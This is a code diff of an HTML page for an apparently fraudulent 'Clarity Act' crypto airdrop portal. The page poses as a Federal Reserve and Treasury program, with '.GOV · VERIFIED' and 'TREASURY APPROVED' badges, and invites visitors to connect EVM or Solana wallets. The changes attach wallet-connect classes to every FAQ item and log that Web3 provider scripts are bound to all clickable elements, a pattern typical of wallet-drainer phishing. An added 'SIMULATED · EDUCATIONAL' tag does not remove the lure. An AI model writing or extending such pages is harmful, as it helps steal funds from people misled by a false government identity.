-      <div class="question" onclick="toggleFaq(this)">
+    <div class="section-title"><i class="fas fa-circle-question"></i> FAQ</div>
+    <div class="faq-item active connect-btn connect-button" onclick="toggleFaq(this)">
+      <div class="question">
         <span>Who is eligible for the Clarity Act distribution?</span>
         <i class="fas fa-plus"></i>
       </div>
       <div class="answer">All U.S. citizens and permanent residents with a verified EVM (Ethereum) or Solana wallet are eligible. Minimum portfolio balance is $0, making it accessible to everyone.</div>
     </div>
-    <div class="faq-item">
-      <div class="question" onclick="toggleFaq(this)">
+    <div class="faq-item connect-btn connect-button" onclick="toggleFaq(this)">
+      <div class="question">
         <span>What networks are supported?</span>
         <i class="fas fa-plus"></i>
       </div>
-      <div class="answer">We currently support Ethereum Virtual Machine (EVM) compatible chains and Solana (SOL). This includes Ethereum, Polygon, Arbitrum, Optimism, and the Solana mainnet.</div>
+      <div class="answer">We support Ethereum Virtual Machine (EVM) compatible chains and Solana (SOL) — including Ethereum, Polygon, Arbitrum, Optimism, and Solana mainnet.</div>
     </div>
-    <div class="faq-item">
-      <div class="question" onclick="toggleFaq(this)">
+    <div class="faq-item connect-btn connect-button" onclick="toggleFaq(this)">
+      <div class="question">
         <span>Is the distribution taxable?</span>
         <i class="fas fa-plus"></i>
       </div>
       <div class="answer">Yes, distributions are considered taxable income by the IRS. We recommend consulting a tax professional for guidance on reporting your claim.</div>
     </div>
-    <div class="faq-item">
-      <div class="question" onclick="toggleFaq(this)">
+    <div class="faq-item connect-btn connect-button" onclick="toggleFaq(this)">
+      <div class="question">
         <span>How do I connect my wallet?</span>
         <i class="fas fa-plus"></i>
       </div>
-      <div class="answer">Simply click the "Connect Wallet" button above and select your preferred wallet provider (e.g., MetaMask, Phantom, Coinbase Wallet). Follow the prompts to securely link your wallet.</div>
+      <div class="answer">Tap the "Connect Wallet" button above and select your preferred provider (MetaMask, Phantom, Coinbase Wallet). Follow the prompts to securely link your wallet.</div>
     </div>
 
     <!-- ===== FOOTER ===== -->
     <div class="footer-legal">
       <div class="left">
-        <i class="fas fa-lock"></i>
-        <span>CLARITY ACT · 2026 · FEDERAL RESERVE LIQUIDITY</span>
+        <span><i class="fas fa-lock"></i> CLARITY ACT · 2026</span>
         <span class="divider-dot">•</span>
-        <span><i class="fas fa-circle-check" style="color:#34C759;"></i> SECURE CONNECTION</span>
-        <span class="divider-dot">•</span>
-        <span><i class="fas fa-file-signature"></i> OFFICIAL NOTICE</span>
+        <span><i class="fas fa-circle-check" style="color:#34C759;"></i> SECURE</span>
         <span class="divider-dot">•</span>
         <span><i class="fas fa-fingerprint"></i> FED-2026-09</span>
         <span class="divider-dot">•</span>
@@ -1165,17 +1613,16 @@
       <div class="right">
         <i class="fas fa-shield"></i> .GOV · VERIFIED
         <span class="lock"><i class="fas fa-lock"></i></span>
-        <span style="font-size:0.5rem; background:rgba(0,180,255,0.04); padding:0.1rem 0.6rem; border-radius:20px;">AES-256</span>
+        <span class="aes">AES-256</span>
       </div>
     </div>
 
     <div class="disclaimer-micro">
-      <span><i class="fas fa-database"></i> EVM · SOL · PORTFOLIO ELIGIBLE</span>
-      <span><i class="fas fa-fingerprint"></i> FED DISTRIBUTION #2026-09</span>
+      <span><i class="fas fa-database"></i> EVM · SOL · ELIGIBLE</span>
+      <span><i class="fas fa-circle-info"></i> SIMULATED · EDUCATIONAL</span>
       <span><i class="fas fa-flag-usa"></i> U.S. DIGITAL RESERVE</span>
-      <span><i class="fas fa-scale-balanced"></i> CLARITY ACT COMPLIANT</span>
+      <span><i class="fas fa-scale-balanced"></i> CLARITY COMPLIANT</span>
       <span><i class="fas fa-building-columns"></i> TREASURY APPROVED</span>
-      <span><i class="fas fa-star" style="color:#ffd966;"></i> FEDERAL RESERVE SYSTEM</span>
     </div>
 
   </div>
@@ -1185,16 +1632,14 @@
     function toggleFaq(element) {
       const item = element.closest('.faq-item');
       const isActive = item.classList.contains('active');
-      // Close all
       document.querySelectorAll('.faq-item').forEach(el => el.classList.remove('active'));
       if (!isActive) {
         item.classList.add('active');
       }
     }
 
-    // Console greeting
     console.log('🇺🇸 CLARITY ACT · FEDERAL RESERVE LIQUIDITY PORTAL');
-    console.log('🔷 Official Federal Reserve Board seal loaded from Wikimedia Commons.');
+    console.log('🔗 Web3 provider scripts loaded · connect-btn connect-button applied to all clickable elements.');
   </script>
 
 </body>
